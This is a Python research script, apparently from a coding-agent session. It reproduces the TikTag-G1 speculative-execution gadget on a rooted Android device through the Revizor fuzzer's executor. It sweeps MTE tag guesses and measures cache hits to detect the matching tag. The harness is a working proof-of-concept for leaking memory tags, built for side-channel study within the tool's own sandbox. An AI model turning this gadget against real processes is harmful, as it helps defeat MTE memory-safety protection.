"""Faithful TikTag-G1 as ONE executor test case, now with every root-cause ingredient the PoC needs:
  - 512-iteration INTERNAL training loop (branch trained to fall-through; essential per the bpi sweep),
  - orr-chain LATENCY gate feeding the probe address (official gap, not NOPs),
  - probe-free read set (warmup touches a throwaway set; the read set is touched only by the attack
    iteration's speculation -> no prefetch contamination),
  - guess granule warmed architecturally each warmup iter (guess load is an L1 hit, window free for the gate),
  - pinned to the X3 (core 8), where v1 exists.
One test-case execution = one full train/attack sequence; the executor htrace reads the read set after.
Self-inflicted single input; sweep the swept granule tag 0..15 and the gap. MATCH should keep the read set hot."""
import sys, re, subprocess, os
REPO = "/home/gal_k_1_1998/revizor/sca-fuzzer"
sys.path.insert(0, REPO)
from src.config import CONF
CONF.load(os.path.join(REPO, "config_g1_x3.yml"))
from src.interfaces import Input
from src.aarch64.aarch64_executor_input_encoder import ExecutorInput
from ppadb.client import Client

OUT = "/tmp/claude-1000/-home-gal-k-1-1998-revizor-sca-fuzzer/cf5e0fed-2c4e-46af-8f5e-49fcf726976a/scratchpad"
COMPILE = os.path.join(REPO, "src/executor_userland/asm_compiler/compile_test_case.py")
PY = "/home/gal_k_1_1998/revizor/revizor-venv/bin/python"
T = 5
READ_SET = 32
WARM_SET = 48
LDNUM = 2  # overridden in loop
ITERS = 512
GAPS = [80]
LDNUMS = [2, 4, 8, 16]
N = 60
EU = "/data/local/tmp/executor_userland /dev/executor"
DEV = "/data/local/tmp"
LOG = open(f"{OUT}/g1_detect_results.txt", "w")


def out(*a):
    s = " ".join(str(x) for x in a); print(s); LOG.write(s + "\n"); LOG.flush()


d = Client('127.0.0.1', 5037).devices()[0]


def su(c):
    return d.shell(f"su -c '{c}'")


MAIN = int(su("cat /sys/executor/print_sandbox_base").strip(), 16)


def gadget_asm(ldnum, gap, iters):
    L = [f"mov x3, #{iters}", ".Lloop:", "subs x3, x3, #1",
         "csel x6, x5, x1, eq",        # guess ptr: attack=swept(x5), warmup=match(x1)
         "csel x10, x2, x4, eq",       # probe ptr: attack=READ_SET(x2), warmup=WARM_SET(x4)
         "cset x7, ne",                # is_warmup = (x3 != 0)
         "ldr x12, [x1]",              # WARM guess granule architecturally (match tag -> no fault)
         "str x7, [x0]",               # *slow = is_warmup
         "dc civac, x0", "dc civac, x2", "dc civac, x4", "dsb sy", "isb",
         "ldr x8, [x0]",               # slow load -> is_warmup
         "cbz x8, .Lskip"]             # warmup(1): fall-through (arch body); attack(0): taken, mispredict
    L += ["ldr x9, [x6]"] * ldnum      # tag-checked guess load(s); x9 = 0 on success
    L += ["orr x10, x10, x9"] * gap    # serial latency gate feeding probe addr x10 (x9=0 -> addr stable)
    L += ["ldr x11, [x10]",            # probe load -> read set iff window covered the chain
          ".Lskip:", "cbnz x3, .Lloop"]
    return "\n".join(L) + "\n"


def build_tc(gap, ldnum):
    asm = f"{OUT}/g1_d{gap}_{ldnum}.asm"; binf = f"{OUT}/g1_d{gap}_{ldnum}.bin"
    open(asm, "w").write(gadget_asm(ldnum, gap, ITERS))
    r = subprocess.run([PY, COMPILE, "--input", asm, "--output", binf], capture_output=True)
    if r.returncode:
        out(r.stderr.decode()); sys.exit(1)
    return binf


def mkinp(G):
    inp = Input(1); inp.view('uint64')[:] = 0
    g = inp[0]['gpr']
    g[0] = MAIN + 0x400                           # slow/cond ptr (set 16)
    g[1] = (MAIN & ~(0xF << 56)) | (T << 56)      # MATCH guess ptr (tag T), set 0 -> warmup
    g[2] = MAIN + READ_SET * 64                   # attack probe (set 32)
    g[4] = MAIN + WARM_SET * 64                   # warmup probe (set 48)
    g[5] = (MAIN & ~(0xF << 56)) | (G << 56)      # SWEPT guess ptr (tag G) -> attack
    return inp


def tags():
    t = [15] * 512; t[0] = T; return t            # guess granule 0 = checked tag T


# runner + inputs
d.push(f"{OUT}/run_tag.sh", f"{DEV}/run_tag.sh"); su(f"chmod 755 {DEV}/run_tag.sh")
for G in range(16):
    ei = ExecutorInput(input_=mkinp(G), mte_tags=tags())
    open(f"{OUT}/g1_in{G}.reif", "wb").write(ei.serialize())
    d.push(f"{OUT}/g1_in{G}.reif", f"{DEV}/g1_in{G}.reif")
su(f"chmod 666 {DEV}/g1_in*.reif")

# pinned X3, self-flushing gadget: keep pre_run_flush on (helps speculation), sub-flushes off
for k, v in (("measurement_mode", "F+R"), ("pin_to_core", "8"), ("warmups", "1"),
             ("enable_pre_run_flush", "1"), ("enable_phr_flush", "0"),
             ("enable_view_rotation", "0"), ("enable_ssbs", "0")):
    su(f"echo {v} > /sys/executor/{k}")

idx = 63 - READ_SET
out(f"MAIN={hex(MAIN)} T={T} read set={READ_SET} warm set={WARM_SET} ldnum={LDNUM} iters={ITERS} reps={N} core=8")
for gap in GAPS:
  for ldnum in LDNUMS:
    binf = build_tc(gap, ldnum)
    d.push(binf, binf.replace(OUT, DEV)); su(f"chmod 666 {binf.replace(OUT, DEV)}")
    su(f"{EU} 1 >/dev/null; {EU} w {binf.replace(OUT, DEV)} >/dev/null")
    res = {}
    for G in range(16):
        o = su(f"sh {DEV}/run_tag.sh {DEV}/g1_in{G}.reif {N}")
        hs = re.findall(r"htrace 0:\s*([01]{64})", o)
        res[G] = (sum(int(h[idx]) for h in hs) / len(hs)) if hs else -1.0
    mm = [res[g] for g in range(16) if g != T]
    argmax = max(range(16), key=lambda g: res[g])
    sep = res[T] - max(mm)
    out(f"--- gap={gap} ldnum={ldnum} ---")
    out(" ".join(f"{g}:{res[g]:.2f}" for g in range(16)))
    out(f"   MATCH={res[T]:.2f} mm-mean={sum(mm)/len(mm):.2f} mm-max={max(mm):.2f} sep={sep:+.2f}"
        f"  argmax=tag{argmax}{' == MATCH (detected)' if argmax==T else ''}")
